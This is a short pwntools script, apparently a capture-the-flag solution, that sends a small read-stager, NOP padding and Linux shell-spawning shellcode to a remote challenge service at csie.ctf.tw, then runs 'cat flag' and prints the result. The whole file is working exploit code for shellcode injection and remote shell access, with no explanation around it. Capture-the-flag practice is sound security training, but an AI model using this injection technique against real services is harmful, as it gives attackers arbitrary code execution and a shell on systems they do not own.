from pwn import *

context.arch = 'amd64'

payload = '''
mov rdi, rax
push 0x64
pop rdx
syscall
'''

padding = asm('nop')*len(payload)

final = asm(payload)+padding+asm(shellcraft.amd64.linux.sh())

#print(final)
r = remote('csie.ctf.tw', 10122)
r.sendline(final)
#r.interactive()
r.sendline('cat flag')
print(r.recvline())
r.close()
